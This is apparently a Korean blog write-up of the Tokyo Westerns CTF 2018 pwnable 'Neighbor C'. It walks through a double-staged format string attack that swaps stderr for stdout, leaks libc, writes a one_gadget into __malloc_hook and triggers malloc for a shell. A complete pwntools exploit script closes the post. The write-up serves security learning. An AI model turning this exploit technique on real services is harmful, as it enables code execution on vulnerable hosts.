+++
title = "Tokyo Westerns CTF 2018 - Neighbor C"
date = "2024-07-14"
description = "Tokyo Westerns CTF 2018 pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "double staged fsb"]
+++
## 0x00. Introduction

``` bash
[*] '/home/user/neighbor'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Environment

제공된 libc가 예전 버전이라 최신 loader로 로드가 안된다.

그렇다고 로컬 libc를 이용하면 풀이가 어려워지기 때문에 docker로 서버를 구성해서 환경을 구축하기로 했다.

``` bash
➜  sudo docker build -t 'neighbor' .
➜  sudo docker run -d -p 9999:9999 --name neighbor neighbor
➜  sudo docker top neighbor
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
user                1001143             1001123             0                   Jul13               ?                   00:00:00            /bin/sh -c socat TCP-LISTEN:9999,reuseaddr,fork EXEC:"/home/user/neighbor",pty,raw,echo=0
user                1001169             1001143             0                   Jul13               ?                   00:00:00            socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/user/neighbor,pty,raw,echo=0
```

이렇게 서버를 구성하면 `9999` 포트를 리스닝하다가 연결이 되면 `EXEC:/home/user/neighbor`를 통해 `neighbor` 프로세스를 실행한다.

그래서 기존의 `exploit.py` 포맷으로는 연결이 불가능하고, 다음과 같이 수정해줘야 제대로 디버깅을 할 수 있다.

``` python
def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen(f"sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{print $1}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)
```

그리고 디버거가 libc를 제대로 읽어서 심볼을 로드하기 위해서 `sysroot` 인자를 줬는데, 그러면 현재 위치를 `root` 디렉토리로 인식하고 libc 파일을 찾게 된다.

따라서 vmmap을 통해 libc 경로를 확인하고 그에 맞춰서 디렉토리를 생성한 후 libc 파일을 복사해주면 된다.

``` bash
➜  ls ./lib/x86_64-linux-gnu
libc-2.23.so
```

## 0x01. Vulnerability

``` c
void __fastcall __noreturn sub_8D0(FILE *stderr)
{
  while ( fgets(format, 256, stdin) )
  {
    fprintf(stderr, format);
    sleep(1u);
  }
  exit(1);
}

void __noreturn sub_937()
{
  puts("Hello neighbor!");
  puts("Please tell me about yourself. I must talk about you to our mayor.");
  sub_8D0(stderr);
}

void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  sleep(0);
  sub_937();
}
```

바이너리를 보면 `sub_8D0()`에서 `fprintf`에 `format`을 직접 입력할 수 있어 FSB가 발생한다.

저번 문제에서도 경험했지만... 취약점이 간단하면 exploit이 복잡해지는데 이 문제도 그런 것 같다.

## 0x02. Exploit

### Stack control

취약점을 활용하기에 앞서 문제는 `format`이 전역변수이기 때문에 stack에 값을 입력할 수가 없다.

그러면 stack에 포인터를 만들 수 없어서 FSB의 핵심인 `%n`을 통해 포인터가 가리키는 곳에 값을 쓰는 것이 불가능하다.

따라서 stack에 있는 값으로 적절하게 원하는 곳에 값을 쓸 수 있는 primitive를 획득해야 한다.

``` bash
gef➤  x/10gx $rsp
0x7fffffffebb0: 0x0000555555400a88      0x00007ffff7dd2540
0x7fffffffebc0: 0x0000000000000000      0x00007ffff7dd2540
0x7fffffffebd0: 0x00007fffffffebe0      0x0000555555400962
0x7fffffffebe0: 0x00007fffffffebf0      0x00005555554009d7
0x7fffffffebf0: 0x00005555554009f0      0x00007ffff7a2d840
```

그래서 `fprintf()`를 할 때의 stack을 출력해보았는데, `push rbp`를 하다가 생긴 stack 영역의 주소가 두 개 있었다.

여기에서 왜 굳이 `main()` -> `sub_937()` -> `sub_8D0()`으로 함수를 호출할까에 대한 의문이 풀렸는데, Double Staged FSB가 가능하게 하기 위함이었다.

`0x7fffffffebd0($rsp+0x20)`이 `0x7fffffffebe0($rsp+0x30)`을 가리키고 있어서 FSB를 이용하면 `0x7fffffffebe0`에 원하는 주소를 구성할 수 있다.

`0x7fffffffebd0`이 9번째 format string이기 때문에, 다음과 같이 payload를 작성하면 `0x7fffffffebe0`에 담겨있는 값을 컨트롤할 수 있다.

 - `%1c%9$hhn` : 0x00007fffffffebf0 -> 0x00007fffffffeb01
 - `%258c%9$hn` : 0x00007fffffffebf0 -> 0x00007fffffff0102
 - `%16909060c%9$n` : 0x00007fffffffebf0 -> 0x00007fff01020304

디버깅 환경에서는 편의를 위해 ASLR을 꺼놓았기 때문에 `$rsp`의 첫 바이트가 `0xb0`로 고정되어있지만, 실제 서버 환경에서는 ASLR이 켜져있을 것이므로 이 때 1/16 확률로 exploit 성공률이 떨어지게 된다.

아무튼 로컬 환경에서는 에러 메세지도 볼 수 있기 때문에 `fprintf(stderr, format)` 결과를 볼 수 있었는데, 서버 환경에서는 에러 메세지를 볼 수가 없다.

따라서 위 stack control을 통해 먼저 해야할 것은 `stderr`를 `stdout`으로 만들어서 다음 단계로 넘어가는 것이라고 판단했다.

### Libc leak

``` bash
# fprintf(stderr, format);
gef➤  x/5i 0x55555540090e
   0x55555540090e:      mov    rax,QWORD PTR [rbp-0x8]
   0x555555400912:      lea    rsi,[rip+0x200747]        # 0x555555601060
   0x555555400919:      mov    rdi,rax
   0x55555540091c:      mov    eax,0x0
   0x555555400921:      call   0x555555400778 <fprintf@plt>
```

`fprintf`의 `stderr`는 libc의 `Data`영역에 있는 `stderr`가 아닌, `sub_8D0()`를 호출할 때 인자로 전달한 stack에 있는 `stderr`이다.

그리고 이 `stderr`는 `$rbp-0x8`으로 접근할 수 있는데, 이 주소는 `0x7fffffffebc8($rsp+0x18)`이다.

다행히 컨트롤할 수 있는 `0x7fffffffebe0`에 이미 stack 영역의 주소가 담겨있으므로, 첫 바이트만 `0xc8`으로 덮으면 `0x7fffffffebe0`이 `0x7fffffffebc8`을 가리키게 된다.

그러면 `0x7fffffffebe0`이 11번째 format string이기 때문에 `stderr`를 `stdout`으로 바꿀 수 있다.

``` bash
gef➤  x/gx 0x555555601020
0x555555601020 <stdout>:        0x00007ffff7dd2620
gef➤  x/gx 0x555555601040
0x555555601040 <stderr>:        0x00007ffff7dd2540
```

하지만 여기에서도 `stderr`와 `stdout`의 두 번째 바이트가 다르기 때문에, `0x7fffffffebc8`의 첫 두 바이트를 `0x2620`으로 덮어쓰게 되면 ASLR에 의해 또다시 exploit 확률이 1/16이 된다.

최종적으로는 1/256 확률로 exploit이 가능하다.

``` bash
'0x7ffff7dd3790 0x7ffff7b04360 0x7ffff7dd3780 0x7ffff7ff2700 0x555555400a88 0x7ffff7dd2540 (nil) 0x7ffff7dd2620 0x7fffffffebe0 0x555555400962 0x7fffffffebc8 0x5555554009d7 0x5555554009f0 0x7ffff7a2d840 \n'
```

``` bash
gef➤  x/10gx $rsp
0x7fffffffebb0: 0x0000555555400a88      0x00007ffff7dd2540
0x7fffffffebc0: 0x0000000000000000      0x00007ffff7dd2620
0x7fffffffebd0: 0x00007fffffffebe0      0x0000555555400962
0x7fffffffebe0: 0x00007fffffffebc8      0x00005555554009d7
0x7fffffffebf0: 0x00005555554009f0      0x00007ffff7a2d840
```

이렇게 얻어진 `stdout`으로 format string을 출력해본 것과 실제 stack의 내용을 비교하면 위와 같다.

자세히 보면 5번째 format string부터 stack의 내용과 일치하는 것을 확인할 수 있는데, stack 앞의 format string은 다음 calling convention에 따라 레지스터의 값들을 출력해준다고 한다.

-   `rsi`, `rdx`, `rcx`, `r8`, `r9`

하지만 위 경우는 `rdx`부터 출력되는 것을 볼 수 있는데, `fprintf`에 두 번째 인자가 들어가서 그런게 아닐까 생각한다.

아무튼 다시 돌아와서 stack의 10번째 값에 libc의 주소가 들어가있으므로 offset을 계산해서 빼주면 libc의 base 주소를 획득할 수 있다.

### Exploit strategy

이제 가장 중요한 **어디에 무엇을 쓸 것인지**에 대한 부분인데, 예전 libc라서 `malloc_hook`을 사용할 수 있다.

따라서 **어디에**는 결정되었고, one shot 가젯을 확인해보았다.

``` bash
➜  one_gadget libc-2.23.so
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```

다행히 조건이 빡세지 않아서 확인해봤는데, `0xf1247`에 위치한 가젯이 활용할 수 있어 보였다.

따라서 **무엇을**도 자연스럽게 해결되었는데, 막상 생각해보니 `malloc`을 어디선가 호출해야 `malloc_hook`이 호출될 것인데...

while문 흐름상 호출되는 함수는 `fgets`와 `fprintf`밖에 없다.

혹시 함수 내부적으로 `malloc`이 호출되는지 확인해보려고 했는데, `fgets`는 간단해서 `malloc`이 없다는 것을 확인할 수 있었다.

반면 `fprintf`는 `vfprintf`을 호출하는데 이 안에 너무 많은 코드가 있어서 확인이 어려웠다.

그래서 구글링을 해보니 정보가 조금 있었다.

-   [https://stackoverflow.com/questions/6743034/does-fprintf-use-malloc-under-the-hood](https://stackoverflow.com/questions/6743034/does-fprintf-use-malloc-under-the-hood)
-   [https://github.com/Naetw/CTF-pwn-tips?tab=readme-ov-file](https://github.com/Naetw/CTF-pwn-tips?tab=readme-ov-file#use-printf-to-trigger-malloc-and-free)

확인해보니 format string을 통해 만들어진 output string이 사이즈가 `0x10001` 이상이면 `malloc`을 트리거할 수 있는 것 같다.

그래서 거꾸로 `malloc`을 호출하는 함수, `j_malloc`을 호출하는 함수를 xref해봤는데 `vfprintf`가 있는 것 까지는 확인했다.

### Arbitrary write

``` bash
gef➤  x/10gx $rsp
0x7fffffffebb0: 0x0000555555400a88      0x00007ffff7dd2540
0x7fffffffebc0: 0x0000000000000000      0x00007ffff7dd2620
0x7fffffffebd0: 0x00007fffffffebe0      0x0000555555400962
0x7fffffffebe0: 0x00007fffffffebc8      0x00005555554009d7
0x7fffffffebf0: 0x00005555554009f0      0x00007ffff7a2d840
```

자, 다시 stack을 보면 `0x7fffffffebc0($rsp+0x10)`이 `NULL`로 비어있다.

이 비어있는 공간(`free_space`)에 Double Staged FSB를 이용해 1차적으로 우리가 원하는 주소(`addr`)을 만들어주고

만들어진 주소를 포인터로 사용해 다시 Double Staged FSB를 이용하여 원하는 값(`value`)을 쓸 것이다.

당연히 `addr`은 `malloc_hook`이 될 것이고, `value`는 로딩된 위치의 one shot 가젯이 될 것이다.

이 과정을 python으로 만들면 다음과 같이 만들 수 있다.

``` python
def arbitrary_write(s, addr, value):
    write_primitive(s, addr, value & 0xffff)
    write_primitive(s, addr + 2, (value & 0xffff0000) >> 16)
    write_primitive(s, addr + 4, (value & 0xffff00000000) >> 32)
    write_primitive(s, addr + 6, (value & 0xffff000000000000) >> 48)

def write_primitive(s, addr, value):
    free_space = rsp + 0x10
    stack_control(s, free_space, addr & 0xffff)
    stack_control(s, free_space + 2, (addr & 0xffff0000) >> 16)
    stack_control(s, free_space + 4, (addr & 0xffff00000000) >> 32)
    stack_control(s, free_space + 6, (addr & 0xffff000000000000) >> 48)

    payload = f"%{value}c".encode()
    payload += b"%7$hn"
    s.sendline(payload)

def stack_control(s, stack, value):
    payload = f"%{stack}c".encode()
    payload += b"%9$hhn"
    s.sendline(payload)

    payload = f"%{value}c".encode()
    payload += b"%11$hn"
    s.sendline(payload)
```

사실 불필요한 payload가 많이 보내져서 효율적이진 않지만, 하다보니 욕심이 나서 라인 하나로 arbitrary write를 할 수 있게 만들었다.

``` python
arbitrary_write(s, malloc_hook, one_gadget)
```

## 0x03. Payload

``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
import sys, os

DEBUG = True
BINARY = "neighbor"
LIBRARY = "libc-2.23.so"

code_base = 0x0000555555400000
rsp = 0xb0
malloc_hook_offset = 0x3c4b10
one_gadget_offset = 0xf1247
bp = {
    'call_8d0' : code_base + 0x95D,
    'fgets' : code_base + 0x8FA,
    'fprintf' : code_base + 0x921,
}

gs = f'''
b *{bp['call_8d0']}
b *{bp['fprintf']}
'''
context.terminal = ['tmux', 'splitw', '-hf']

def arbitrary_write(s, addr, value):
    write_primitive(s, addr, value & 0xffff)
    write_primitive(s, addr + 2, (value & 0xffff0000) >> 16)
    write_primitive(s, addr + 4, (value & 0xffff00000000) >> 32)
    write_primitive(s, addr + 6, (value & 0xffff000000000000) >> 48)

def write_primitive(s, addr, value):
    free_space = rsp + 0x10
    stack_control(s, free_space, addr & 0xffff)
    stack_control(s, free_space + 2, (addr & 0xffff0000) >> 16)
    stack_control(s, free_space + 4, (addr & 0xffff00000000) >> 32)
    stack_control(s, free_space + 6, (addr & 0xffff000000000000) >> 48)

    payload = f"%{value}c".encode()
    payload += b"%7$hn"
    s.sendline(payload)
    s.recv(0xffff)
    sleep(1)

def stack_control(s, stack, value, stderr=False):
    if value == 0:
        return
    log.info(f"writing {hex(value)} to {hex(stack)}")
    payload = f"%{stack}c".encode()
    payload += b"%9$hhn"
    s.sendline(payload)
    if stderr == False:
        s.recv(0xffff)
    sleep(1)

    payload = f"%{value}c".encode()
    payload += b"%11$hn"
    s.sendline(payload)
    if stderr == False:
        s.recv(0xffff)
    sleep(1)

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
        pid = os.popen("sudo docker top {BINARY} -eo pid,comm | grep {BINARY} | awk '{print $1}'").read()
        if DEBUG:
            gdb.attach(int(pid), gs, exe=BINARY, sysroot="./")
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recv()

    # overwrite stderr in stack to stdout
    stack_control(s, rsp + 0x18, 0x2620, stderr=True)

    # leak libc base
    payload = b"%14$p"
    s.sendline(payload)
    libc = int(s.recv(), 16) - 0x20840
    sleep(1)
    malloc_hook = libc + malloc_hook_offset
    one_gadget = libc + one_gadget_offset
    log.info(f"libc : {hex(libc)}")
    log.info(f"malloc_hook : {hex(malloc_hook)}")
    log.info(f"one_gadget : {hex(one_gadget)}")

    # write one_gadget address to malloc_hook
    arbitrary_write(s, malloc_hook, one_gadget)

    # trigger malloc -> malloc_hook
    s.sendline(f"%{0x21000}c".encode())
    s.recv(0x21000)
    sleep(1)
    s.interactive()

if __name__=='__main__':
    main()
```